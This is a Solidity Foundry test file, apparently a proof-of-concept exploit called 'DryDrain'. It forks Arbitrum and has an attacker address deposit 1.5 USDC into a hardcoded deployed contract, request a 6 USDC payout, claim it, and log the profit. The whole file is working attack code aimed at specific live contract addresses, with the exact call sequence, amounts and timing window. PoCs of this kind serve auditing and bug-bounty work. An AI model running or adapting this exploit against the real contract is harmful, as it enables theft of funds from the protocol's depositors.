// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract DryDrain is Test {
    address constant CORE  = 0xa653F620EA8F5539Ed4bB55bE2977262FBa1F2dC;
    address constant USDC  = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant SHARE = 0x25F02c58e916ec7796771105C7DBd65d1993d83d;

    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("arb", vm.envUint("FORK_BLOCK"));
        vm.warp(block.timestamp + 60); // sit inside the 1,588s report window
        deal(USDC, attacker, 2e6);
    }

    function test_dryDrain() public {
        uint256 startUsdc = IERC20(USDC).balanceOf(attacker);
        emit log_named_uint("attacker USDC start", startUsdc);

        vm.startPrank(attacker);
        IERC20(USDC).approve(CORE, type(uint256).max);

        (bool ok, bytes memory ret) = CORE.call(abi.encodeWithSignature("deposit(uint256,uint256)", uint256(1_500_000), uint256(0)));
        emit log_named_uint("call ok", ok ? 1 : 0); emit log_named_bytes("call ret", ret);
        uint256 shares = IERC20(SHARE).balanceOf(attacker);
        emit log_named_uint("shares minted", shares);
        emit log_named_uint("usdc after deposit", IERC20(USDC).balanceOf(attacker));

        (ok, ret) = CORE.call(abi.encodeWithSignature("requestPayout(uint256,uint8,uint16)", uint256(6_000_000), uint8(0), uint16(10_000)));
        emit log_named_uint("call ok", ok ? 1 : 0); emit log_named_bytes("call ret", ret);

        (ok, ret) = CORE.call(abi.encodeWithSignature("claimPayout(uint16)", uint16(10_000)));
        emit log_named_uint("call ok", ok ? 1 : 0); emit log_named_bytes("call ret", ret);
        vm.stopPrank();

        uint256 endUsdc = IERC20(USDC).balanceOf(attacker);
        emit log_named_uint("attacker USDC end", endUsdc);
        if (endUsdc > startUsdc) emit log_named_uint("PROFIT", endUsdc - startUsdc);
        else emit log_named_uint("LOSS", startUsdc - endUsdc);
    }
}
